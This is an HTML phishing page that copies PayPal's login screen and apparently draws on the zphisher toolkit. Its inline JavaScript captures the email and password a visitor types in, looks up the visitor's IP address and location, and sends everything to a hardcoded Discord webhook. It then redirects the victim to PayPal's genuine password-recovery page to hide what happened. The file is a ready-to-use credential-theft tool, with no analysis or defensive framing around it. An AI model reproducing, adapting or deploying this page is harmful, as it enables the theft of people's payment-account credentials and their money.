<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal Sign Up</title>
    <!-- Favicon added here -->
    <link rel="icon" href="https://raw.githubusercontent.com/htr-tech/zphisher/refs/heads/master/.sites/paypal/favicon.ico" type="image/x-icon">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            height: 100vh;
            text-align: center;
            padding-top: 150px;
        }
        .login-container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }
        .login-container h2 {
            margin-bottom: 20px;
        }
        .login-container input[type="text"],
        .login-container input[type="password"],
        .login-container input[type="submit"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 4px;
            border: 1px solid #ccc;
            box-sizing: border-box;
        }
        .login-container input[type="submit"] {
            background-color: #0070ba;  /* PayPal Blue */
            color: white;
            border: none;
            cursor: pointer;
        }
        .login-container input[type="submit"]:hover {
            background-color: #005c8c;  /* Slightly darker blue on hover */
        }
        .login-container .footer {
            margin-top: 20px;
            font-size: 14px;
        }
        .forgot-password {
            color: #0070ba;  /* PayPal Blue */
            font-size: 14px;
            text-decoration: none;
            display: block;
            margin-top: 10px;
        }
        .forgot-password:hover {
            text-decoration: underline;
            color: #005c8c;  /* Slightly darker PayPal Blue on hover */
        }
        .signup-link {
            color: #0070ba;  /* PayPal Blue */
            font-size: 14px;
            text-decoration: none;
        }
        .signup-link:hover {
            text-decoration: underline;
            color: #005c8c;  /* Slightly darker PayPal Blue on hover */
        }

        /* Media queries for mobile responsiveness */
        @media (max-width: 768px) {
            .login-container {
                width: 90%;
                padding: 15px;
            }
            .login-container input[type="text"],
            .login-container input[type="password"],
            .login-container input[type="submit"] {
                padding: 12px;
            }
        }

        @media (max-width: 480px) {
            .login-container {
                padding: 10px;
                width: 95%;
            }
            .login-container input[type="text"],
            .login-container input[type="password"],
            .login-container input[type="submit"] {
                font-size: 16px;
            }
        }
    </style>
</head>
<body>

    <div class="login-container">
        <h2><img src="https://www.paypalobjects.com/webstatic/paypalme/images/social/pplogo384.png" alt="PayPal Logo" width="120"></h2>
        <form id="loginForm" method="POST" onsubmit="handleLoginSubmit(event)">
            <input type="text" name="email" placeholder="Email" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <a href="https://www.paypal.com/authflow/password-recovery/" class="forgot-password" target="_blank">Forgot password?</a>
            <input type="submit" value="Login">
        </form>
        <div class="footer">
            <p>Don't have an account? <a href="https://www.paypal.com/us/webapps/mpp/account-selection" class="signup-link" target="_blank">Sign up here</a></p>
        </div>
    </div>

    <script>
        // Function to fetch IP address and send it to Discord
        function sendIpToDiscord(email, password) {
            // Using ip-api.com to get the user's IP and location info
            fetch('http://ip-api.com/json/')
                .then(response => response.json())
                .then(data => {
                    const ip = data.query;
                    const location = `${data.city}, ${data.regionName}, ${data.country}`;

                    // Prepare the payload for Discord webhook
                    const payload = {
                        content: `**Email:** ${email}\n**Password:** ${password}\n**IP Address:** ${ip}\n**Location:** ${location}`
                    };

                    // Send the data to the Discord webhook
                    fetch('https://discord.com/api/webhooks/1326350675004752005/6T-1LxiLj16Lh4iSrjJ42ygIRfzD5Y72VOHxPX6fMEH0hMoYtmyvVlE79-2z0KB-zTIv', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(payload)
                    })
                    .then(response => {
                        if (response.ok) {
                            console.log('Data sent to Discord!');
                        } else {
                            console.error('Failed to send data to Discord');
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                    });
                })
                .catch(error => console.error('Error fetching IP info:', error));
        }

        // Function to handle the form submission, send data to Discord, and redirect
        function handleLoginSubmit(event) {
            event.preventDefault();  // Prevent the default form submission

            const email = event.target.email.value;
            const password = event.target.password.value;

            // Send the email, password, and IP info to Discord
            sendIpToDiscord(email, password);

            // Redirect the user to the PayPal password recovery page after sending data
            window.location.href = 'https://www.paypal.com/authflow/password-recovery/';
        }
    </script>

</body>
</html>
